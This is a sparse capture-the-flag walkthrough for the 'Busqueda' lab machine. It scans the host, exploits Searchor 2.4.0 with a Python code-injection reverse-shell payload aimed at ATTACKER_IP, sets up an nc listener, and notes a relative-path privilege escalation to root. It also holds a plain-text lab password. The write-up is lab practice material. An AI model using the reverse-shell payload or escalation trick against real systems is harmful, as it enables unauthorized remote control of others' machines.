


Busqueda
https://youtu.be/1nfnDrOZA7Y
nmap -T4 -p- -A ip
gedit /etc/hosts
>add >  10.10.11.208    searcher.ht b

go to this url
you will find many vuln of this "Searchor 2.4.0"

https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-
#Run this query  #change attacker IP and port
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))# 
#Prepare a listener: 
nc -lvnp PORT





#ssh login using that pw jh1usoih2bkjaspwe92



#can run this cmd as root



# use "| jq" to arrange output
#And you will find password. This is a docker admin password.
#We will try to login to gitea.searcher.htb page

nano /etc/hosts







#Of particular interest is the fact that the system-checkup.py script references the full-checkup.sh script using a relative path, ./full-checkup.sh , instead of an absolute path such as /opt/scripts/fullcheckup.sh , within the system-checkup.py file. This suggests that the system-checkup.py script attempts to execute full-checkup.sh from the directory where system-checkup.py was executed.





![image](https://github.com/user-attachments/assets/b4397a0b-4b0c-4f6b-a70a-5e755d951742)
